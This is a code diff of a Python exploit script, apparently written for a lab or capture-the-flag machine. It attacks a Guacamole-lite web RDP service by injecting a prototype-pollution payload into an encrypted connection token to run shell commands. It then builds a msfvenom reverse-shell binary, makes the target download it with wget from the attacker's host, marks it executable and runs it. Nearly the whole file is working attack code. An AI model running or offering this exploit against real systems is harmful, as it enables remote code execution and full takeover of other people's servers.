@@ -1,6 +1,9 @@
 import requests
 import sys
 import json
+import os
+import time
+import subprocess
 from token_enc import encrypt
 
 payload = {
@@ -21,11 +24,49 @@ payload = {
 }
 
 def request_rdp(ip, token):
-  target = f"http://chips/rdp?token={token}"
-  print("Target")
+  proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+  }
+
+  target = f"http://{ip}/rdp?token={token}"
   print(target)
+
+  target = f"http://{ip}/guaclite?token={token}&width=1910&height=877"
+  headers = {
+    "Sec-WebSocket-Version": "13",
+    "Sec-WebSocket-Key": "U9nWAlEc7p2z8jqqkhlkWg==",
+    "Upgrade": "websocket",
+    "Connection": "keep-alive, Upgrade"
+  }
+  r = requests.get(target, headers=headers,proxies=proxies)
+  print(r.status_code)
+
+  time.sleep(4)
+  target = f"http://{ip}/"
+  r = requests.get(target)
+
+def send_command(ip, cmd):
+  payload["connection"]["settings"]["__proto__"] = {
+    "outputFunctionName": ("x = 1;"
+    f"process.mainModule.require('child_process').execSync(\'{cmd}\')"
+    "; var y")
+  }
+
+  print("Sending Payload:")
+  print(json.dumps(payload))
   print()
-  requests.get(target)
+
+  token = encrypt(payload)
+
+  request_rdp(ip, token)
+
+def generate_shell(LHOST, LPORT):
+  cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o reverse.elf"
+  print("[+] Generating MSFvenom shell!")
+  print("[+] Ensure that web server is running on port 8000!")
+
+  subprocess.run(cmd, shell=True)
 
 def main():
   if len(sys.argv) != 2:
@@ -35,16 +76,32 @@ def main():
 
   ip = sys.argv[1]
 
-  payload["connection"]["settings"]["__proto__"] = {
-    "outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); var y"
-  }
+  LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+  LPORT = 9001
 
-  print(json.dumps(payload))
-  print()
+  # payload["connection"]["settings"]["__proto__"] = {
+  #   "outputFunctionName": ("x = 1;"
+  #   "cp = process.mainModule.require(\'child_process\');"
+  #   "sh = cp.spawn('/bin/sh', []);"
+  #   "var client = new process.mainModule.net.Socket();"
+  #   "console.log(\'hellotest11\')"
+  #   "; var y")
+  # }
 
-  token = encrypt(payload)
+  # payload["connection"]["settings"]["__proto__"] = {
+  #   "outputFunctionName": ("x = 1;"
+  #   "console.log(process.mainModule.require('child_process').execSync('pwd').toString())"
+  #   "; var y")
+  # }
 
-  request_rdp(ip, token)
+  generate_shell(LHOST, LPORT)
+
+  print("[+]Sending reverse shell!")
+  send_command(ip, f"wget http://{LHOST}:8000/reverse.elf -O /tmp/reverse.elf")
+  print("[+]Adding permissions to reverse shell!")
+  send_command(ip, f"chmod +x /tmp/reverse.elf")
+  print("[+]Triggering reverse shell!")
+  send_command(ip, f"/tmp/reverse.elf")
 
 if __name__ == '__main__':
   main()
